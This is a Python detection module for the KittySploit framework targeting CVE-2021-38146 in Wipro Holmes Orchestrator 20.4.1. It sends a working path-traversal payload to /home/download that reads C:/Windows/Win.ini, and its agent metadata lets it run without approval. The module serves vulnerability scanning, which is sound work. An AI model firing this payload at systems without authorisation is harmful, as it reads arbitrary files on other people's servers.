#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The File Download API in Wipro Holmes Orchestrator 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wipro Holmes Orchestrator 20.4.1 - Arbitrary File Download Detection',
        'description': 'The File Download API in Wipro Holmes Orchestrator 20.4.1 (20.4.1_02_11_2020) allows remote attackers to read arbitrary files via absolute path traversal in the SearchString JSON field in /home/download POST data.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wipro', 'holmes', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/164970/Wipro-Holmes-Orchestrator-20.4.1-Arbitrary-File-Download.html',
            'https://flippingbitz.com/post/wipro-ho-2041-cve/',
            'https://www.wipro.com/holmes/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-38146',
        ],
        'cve': 'CVE-2021-38146',
    }

    def run(self):
        path = '/home/download'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "SearchString": "C:/Windows/Win.ini",\n  "Msg": ""\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('[fonts]', '[extensions]', '[files]',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason='Wipro Holmes Orchestrator 20.4.1 - Arbitrary File Download detected',
                path=path,
            )
            return True
        return False

